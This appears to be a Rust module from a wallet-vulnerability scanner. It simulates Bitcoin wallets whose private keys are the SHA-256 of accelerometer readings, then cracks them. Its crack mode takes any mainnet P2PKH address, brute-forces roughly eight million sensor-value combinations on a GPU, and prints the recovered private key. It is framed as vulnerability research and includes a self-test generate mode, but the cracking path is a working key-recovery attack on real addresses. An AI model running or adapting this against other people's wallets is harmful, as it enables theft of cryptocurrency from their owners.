use crate::scans::gpu_solver::GpuSolver;
use anyhow::Result;
use bitcoin::hashes::{sha256, Hash};
use bitcoin::secp256k1::{Secp256k1, SecretKey};
use bitcoin::{Address, Network};
use hex;
use rand::Rng;
use std::str::FromStr;

/// Mobile Sensor Entropy Vulnerability Scanner & Cracker
///
/// Mode 1: Generate (No target)
/// Simulates a wallet created with low-entropy sensor data.
/// Prints the address and the secret sensor values.
///
/// Mode 2: Crack (--target <addr>)
/// Uses GPU to brute-force the sensor values (x,y,z) that generated the target address.
pub fn run(target: Option<String>) -> Result<()> {
    println!("Mobile Sensor Entropy Vulnerability (GPU-Accelerated)");

    // Initialize GPU
    let solver = GpuSolver::new()?;
    println!("[GPU] Solver initialized");

    if let Some(target_addr) = target {
        // CRACK MODE
        println!("Mode: CRACK");
        println!("Target Address: {}", target_addr);

        let address = Address::from_str(&target_addr)?.require_network(Network::Bitcoin)?;
        let script = address.script_pubkey();
        if !script.is_p2pkh() {
            eprintln!("Warning: Not a P2PKH address, skipping.");
            return Ok(());
        }
        // P2PKH script: OP_DUP OP_HASH160 <20-byte-hash> OP_EQUALVERIFY OP_CHECKSIG
        // Hash is at offset 3 (1 byte OP_DUP, 1 byte OP_HASH160, 1 byte len 0x14)
        let hash_bytes: [u8; 20] = script.as_bytes()[3..23].try_into()?;

        println!("Target Hash160: {}", hex::encode(hash_bytes));
        println!("Launching GPU Brute-Force (Search Space: ~8M combinations)...");

        let start_time = std::time::Instant::now();
        let results = solver.compute_mobile_crack(&hash_bytes)?;

        if !results.is_empty() {
            let gid = results[0];
            // Decode GID to x, y, z
            let range = 201;
            let z_idx = gid % range as u64;
            let y_idx = (gid / range as u64) % range as u64;
            let x_idx = gid / (range as u64 * range as u64);

            let acc_x = x_idx as i32 - 100;
            let acc_y = y_idx as i32 - 100;
            let acc_z = z_idx as i32 + 900;

            println!("\n[GPU] 🔓 CRACKED SUCCESSFUL!");
            println!("Secret Sensor Values found:");
            println!("  acc_x: {}", acc_x);
            println!("  acc_y: {}", acc_y);
            println!("  acc_z: {}", acc_z);

            // Reconstruct Key to verify
            let seed_input = format!("{},{},{}", acc_x, acc_y, acc_z);
            let seed_hash = sha256::Hash::hash(seed_input.as_bytes());
            let priv_key_bytes = seed_hash.to_byte_array();

            println!("  Private Key: {}", hex::encode(priv_key_bytes));
            println!("  Seed String: \"{}\"", seed_input);
        } else {
            println!("\n[GPU] Failed to crack. Target might not be in search space.");
        }

        println!("Time elapsed: {:.2}s", start_time.elapsed().as_secs_f64());
    } else {
        // GENERATE MODE
        println!("Mode: GENERATE (Weak Wallet)");

        // Pick random sensor values in the search space
        let mut rng = rand::thread_rng();
        let acc_x = rng.gen_range(-20..20);
        let acc_y = rng.gen_range(-20..20);
        let acc_z = rng.gen_range(970..990);

        let seed_input = format!("{},{},{}", acc_x, acc_y, acc_z);
        let seed_hash = sha256::Hash::hash(seed_input.as_bytes());
        let priv_key_bytes = seed_hash.to_byte_array();

        let secp = Secp256k1::new();
        let secret_key = SecretKey::from_slice(&priv_key_bytes)?;
        let pubkey = secret_key.public_key(&secp);
        let address = Address::p2pkh(bitcoin::PublicKey::new(pubkey), Network::Bitcoin);

        println!("\nGenerated Weak Wallet:");
        println!("  Address: {}", address);
        println!(
            "  (Secret) Sensor Values: x={}, y={}, z={}",
            acc_x, acc_y, acc_z
        );
        println!("  (Secret) Private Key:   {}", hex::encode(priv_key_bytes));

        println!("\nTo test cracking, run:");
        println!(
            "  cargo run --release -- mobile-sensor --target {}",
            address
        );
    }

    Ok(())
}
